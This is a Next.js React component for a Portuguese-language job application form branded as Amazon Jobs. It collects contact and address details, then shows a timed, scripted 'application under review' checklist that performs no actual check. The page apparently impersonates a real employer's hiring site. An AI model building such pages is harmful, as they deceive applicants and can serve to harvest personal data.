"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import Image from "next/image";
import "./candidatura.css";

export default function Candidatura() {
  const router = useRouter();

  const [currentStep, setCurrentStep] = useState(1);
  const [errors, setErrors] = useState<{ [key: string]: string }>({});
    const [vaga, setVaga] = useState<any>(null); // 👈 state para vaga do localStorage

  const [formData, setFormData] = useState({
    nome: "",
    sobrenome: "",
    email: "",
    telefone: "",
    dataNascimento: "",
    endereco: "",
    cidade: "",
    estado: "",
    cep: "",
    pais: "Brasil",
    consentimentoSms: false,
    feedbackConsent: false,
    avaliacao1: "",
    avaliacao2: "",
    curriculo: null as File | null,
  });

  const steps = [
    { id: 1, label: "Informações de contato" },
    { id: 2, label: "Avaliação" },
    { id: 3, label: "Revisar e enviar" },
    { id: 4, label: "Análise" },
  ];

   // 🔹 Carrega vaga do localStorage
  useEffect(() => {
    const vagaSalva = localStorage.getItem("vagaSelecionada");
    if (vagaSalva) {
      setVaga(JSON.parse(vagaSalva));
    }
  }, []);

  const handleChange = (
    e: React.ChangeEvent<
      HTMLInputElement | HTMLSelectElement | HTMLTextAreaElement
    >
  ) => {
    const { name, value, type, checked, files } = e.target as any;
    if (type === "checkbox") {
      setFormData({ ...formData, [name]: checked });
    } else if (files) {
      setFormData({ ...formData, [name]: files[0] });
    } else {
      setFormData({ ...formData, [name]: value });
    }

    if (errors[name]) {
      setErrors((prev) => ({ ...prev, [name]: "" }));
    }
  };

  const validateStep = () => {
    const newErrors: { [key: string]: string } = {};
    if (currentStep === 1) {
      const requiredFields = [
        "nome",
        "sobrenome",
        "email",
        "telefone",
        "dataNascimento",
        "endereco",
        "cidade",
        "estado",
        "cep",
      ];
      requiredFields.forEach((field) => {
        if (!formData[field as keyof typeof formData]) {
          newErrors[field] = "Preencha este campo";
        }
      });
    }
    if (currentStep === 2) {
      if (!formData.avaliacao1) newErrors.avaliacao1 = "Preencha este campo";
      if (!formData.avaliacao2) newErrors.avaliacao2 = "Preencha este campo";
    }
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleNext = () => {
    if (!validateStep()) return;

    if (currentStep === 3) {
      // 👉 Salva no localStorage só quando o usuário confirma no Step 3
      localStorage.setItem(
        "candidatoInfo",
        JSON.stringify({
          nome: `${formData.nome} ${formData.sobrenome}`.trim(),
          email: formData.email,
        })
      );
      console.log("✅ candidatoInfo salvo:", {
        nome: `${formData.nome} ${formData.sobrenome}`.trim(),
        email: formData.email,
      });

      setCurrentStep(4); // vai direto para análise
    } else {
      setCurrentStep(currentStep + 1);
    }
  };

const handleSubmit = (e: React.FormEvent) => {
  e.preventDefault();

  if (currentStep === 3) {
    localStorage.setItem(
      "candidatoInfo",
      JSON.stringify({
        nome: `${formData.nome} ${formData.sobrenome}`.trim(),
        email: formData.email,
      })
    );
  }

  setCurrentStep(4); // Vai para análise
};



  
  // Step 4 → redireciona depois de 30s
  useEffect(() => {
    if (currentStep === 4) {
      const timer = setTimeout(() => {
        router.push("/jobSucess");
      }, 60000);
      return () => clearTimeout(timer);
    }
  }, [currentStep, router]);

const checklist = [
  "Validando informações pessoais",
  "Confirmando dados de contato",
  "Verificando disponibilidade da vaga",
  "Análise final concluída"
];

const [currentCheck, setCurrentCheck] = useState(0);

// Avança no checklist a cada 7.5 segundos (4 itens → ~30s)
useEffect(() => {
  if (currentStep === 4) {
    setCurrentCheck(0); // reinicia
    let index = 0;
    const interval = setInterval(() => {
      index++;
      setCurrentCheck(index);
      if (index >= checklist.length) clearInterval(interval);
    }, 7500);

    return () => clearInterval(interval);
  }
}, [currentStep]);


  return (
    <main className="candidatura">
      {/* HEADER */}
      <header>
        <div className="navbar">
          <div className="navbar-left">
            <Image
              src="/logo_dark.99265b07.svg"
              alt="Amazon Jobs"
              width={120}
              height={36}
              priority
            />
          </div>
          <nav className="navbar-center">
            <a href="#como-funciona">Oportunidades de Emprego</a>
            <a href="#faq">Pesquisar todas as vagas</a>
            <a href="#">Começando</a>
            <a href="#">Minha conta</a>
          </nav>
        </div>
      </header>

      {/* HERO */}
      <section className="candidatura-hero">
        <h1>Candidate-se para {vaga ? vaga.titulo : "a vaga selecionada"}</h1>
        <p>
          ID da vaga: {vaga ? vaga.id : "—"} | {vaga ? vaga.local : "—"}
        </p>
      </section>

      {/* STEPS */}
      <div className="steps">
        {steps.map((step) => (
          <div
            key={step.id}
            className={`step ${currentStep === step.id ? "active" : ""}`}
          >
            <span>{step.id}</span>
            <p>{step.label}</p>
          </div>
        ))}
      </div>

      {/* FORMULÁRIO */}
      <form className="candidatura-form" onSubmit={handleSubmit}>
        {/* Step 1 */}
        {currentStep === 1 && (
          <div className="form-grid">
            <label>
              {errors.nome && <span className="error">{errors.nome}</span>}
              <span className="label-text">
                Nome <span className="required">*</span>
              </span>
              <input
                type="text"
                name="nome"
                value={formData.nome}
                onChange={handleChange}
                required
              />
            </label>

            <label>
              {errors.sobrenome && (
                <span className="error">{errors.sobrenome}</span>
              )}
              <span className="label-text">
                Sobrenome <span className="required">*</span>
              </span>
              <input
                type="text"
                name="sobrenome"
                value={formData.sobrenome}
                onChange={handleChange}
                required
              />
            </label>

            <label>
              {errors.dataNascimento && (
                <span className="error">{errors.dataNascimento}</span>
              )}
              <span className="label-text">
                Data de Nascimento <span className="required">*</span>
              </span>
              <input
                type="date"
                name="dataNascimento"
                value={formData.dataNascimento}
                onChange={handleChange}
                required
              />
            </label>

            <label>
              {errors.email && <span className="error">{errors.email}</span>}
              <span className="label-text">
                E-mail <span className="required">*</span>
              </span>
              <input
                type="email"
                name="email"
                value={formData.email}
                onChange={handleChange}
                required
              />
            </label>

            <label>
              {errors.telefone && (
                <span className="error">{errors.telefone}</span>
              )}
              <span className="label-text">
                Telefone <span className="required">*</span>
              </span>
              <input
                type="tel"
                name="telefone"
                value={formData.telefone}
                onChange={handleChange}
                required
              />
            </label>

            <label>
              {errors.endereco && (
                <span className="error">{errors.endereco}</span>
              )}
              <span className="label-text">
                Endereço <span className="required">*</span>
              </span>
              <input
                type="text"
                name="endereco"
                value={formData.endereco}
                onChange={handleChange}
                required
              />
            </label>

            <label>
              {errors.cidade && <span className="error">{errors.cidade}</span>}
              <span className="label-text">
                Cidade <span className="required">*</span>
              </span>
              <input
                type="text"
                name="cidade"
                value={formData.cidade}
                onChange={handleChange}
                required
              />
            </label>

            <label>
              {errors.estado && <span className="error">{errors.estado}</span>}
              <span className="label-text">
                Estado/Província <span className="required">*</span>
              </span>
              <input
                type="text"
                name="estado"
                value={formData.estado}
                onChange={handleChange}
                required
              />
            </label>

            <label>
              {errors.cep && <span className="error">{errors.cep}</span>}
              <span className="label-text">
                CEP <span className="required">*</span>
              </span>
              <input
                type="text"
                name="cep"
                value={formData.cep}
                onChange={handleChange}
                required
              />
            </label>

            <label>
              <span className="label-text">País</span>
              <input
                type="text"
                name="pais"
                value={formData.pais}
                onChange={handleChange}
                disabled
              />
            </label>
          </div>
        )}

        {/* Step 2 */}
        {currentStep === 2 && (
          <div className="avaliacao">
            <h2>Avaliação</h2>
            <label>
              {errors.avaliacao1 && (
                <span className="error">{errors.avaliacao1}</span>
              )}
              <span className="label-text">
                Por que você gostaria de trabalhar na Amazon?{" "}
                <span className="required">*</span>
              </span>
              <textarea
                name="avaliacao1"
                value={formData.avaliacao1}
                onChange={handleChange}
                required
              />
            </label>

            <label>
              {errors.avaliacao2 && (
                <span className="error">{errors.avaliacao2}</span>
              )}
              <span className="label-text">
                Você tem experiência anterior em atendimento ao cliente?{" "}
                <span className="required">*</span>
              </span>
              <select
                name="avaliacao2"
                value={formData.avaliacao2}
                onChange={handleChange}
                required
              >
                <option value="">Selecione</option>
                <option value="sim">Sim</option>
                <option value="nao">Não</option>
              </select>
            </label>
          </div>
        )}
{currentStep === 3 && (
  <div className="revisao">
    <h2>Revisar e Enviar</h2>
    <p>Confira suas informações antes de enviar:</p>

    <div className="revisao-box">
      <h3>Informações de contato</h3>
      <ul>
        <li><b>Nome:</b> {formData.nome}</li>
        <li><b>Sobrenome:</b> {formData.sobrenome}</li>
        <li><b>Email:</b> {formData.email}</li>
        <li><b>Telefone:</b> {formData.telefone}</li>
        <li><b>Data de Nascimento:</b> {formData.dataNascimento}</li>
        <li><b>Endereço:</b> {formData.endereco}</li>
        <li><b>Cidade:</b> {formData.cidade}</li>
        <li><b>Estado:</b> {formData.estado}</li>
        <li><b>CEP:</b> {formData.cep}</li>
        <li><b>País:</b> {formData.pais}</li>
      </ul>
    </div>

    <p>Se todas as informações estiverem corretas, clique em <b>Próximo</b>.</p>
  </div>
)}


{/* Step 4 - Análise */}
{currentStep === 4 && (
  <div className="analise">
    <div className="spinner"></div>
    <h2>Sua candidatura está em análise</h2>
    <p>
      Nossa equipe de recrutamento está avaliando suas informações.
      Isso pode levar alguns segundos...
    </p>

    {/* Checklist dinâmico */}
    <ul className="analise-checklist">
      {checklist.map((item, index) => (
        <li key={index} className={currentCheck > index ? "done" : currentCheck === index ? "loading" : "hidden"}>
          {currentCheck > index ? "✔ " : currentCheck === index ? "" : ""}{item}
        </li>
      ))}
    </ul>

    <p className="analise-info">
      Aguarde até <b>30 segundos</b>. Você será redirecionado automaticamente.
    </p>
  </div>
)}


        {/* Navegação */}
        {currentStep !== 4 && (
          <div className="form-navigation">
            {currentStep > 1 && (
              <button
                type="button"
                onClick={() => setCurrentStep(currentStep - 1)}
              >
                Voltar
              </button>
            )}
            <button type="button" onClick={handleNext}>
              Próximo
            </button>
          </div>
        )}
      </form>
          {/* FOOTER */}
                  <footer className="footer">
                    <div className="footer-social">
                      <h4>Junte-se a nós agora</h4>
                      <a href="#" aria-label="Facebook" className="social-link">
                        <svg
                          width="22"
                          height="22"
                          viewBox="0 0 448 512"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path d="M400 32H48A48 48 0 0 0 0 80v352a48 48 0 0 0 48 48h137.25V327.69h-63V256h63v-54.64c0-62.15 
                          37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.27c-30.81 0-40.42 19.12-40.42 
                          38.73V256h68.78l-11 71.69h-57.78V480H400a48 48 0 0 0 48-48V80a48 48 0 0 0-48-48z"/>
                        </svg>
                      </a>
                    </div>
            
                    <div className="footer-top">
                      <div className="footer-col">
                        <h4>OPORTUNIDADES DE EMPREGO</h4>
                        <ul>
                          <li><a href="#">Oportunidades em Centros de Distribuição e Estações de Entrega</a></li>
                          <li><a href="#">Empregos de atendimento ao cliente</a></li>
                          <li><a href="#">Procura de emprego</a></li>
                        </ul>
                      </div>
            
                      <div className="footer-col">
                        <h4>RECURSOS</h4>
                        <ul>
                          <li><a href="#">Perguntas Frequentes</a></li>
                          <li><a href="#">Fale Conosco</a></li>
                        </ul>
                      </div>
            
                      <div className="footer-logo">
                        <Image
                          src="/logo.92a0feec.svg"
                          alt="Amazon Jobs"
                          width={140}
                          height={40}
                        />
                      </div>
                    </div>
            
                    <div className="footer-bottom">
                      <p className="descricao">
                        A Amazon está comprometida com um ambiente de trabalho diversificado e inclusivo.  
                        A Amazon é uma empregadora que oferece oportunidades iguais e não discrimina com base em raça, nacionalidade, sexo, identidade de gênero, orientação sexual, deficiência, idade ou outro status legalmente protegido.
                      </p>
            
                      <div className="footer-legal">
                        <a href="#">Aviso de privacidade</a>
                        <span>© 1996–2025 Amazon.com, Inc. ou suas afiliadas</span>
                      </div>
                    </div>
                  </footer>
    </main>
  );
}
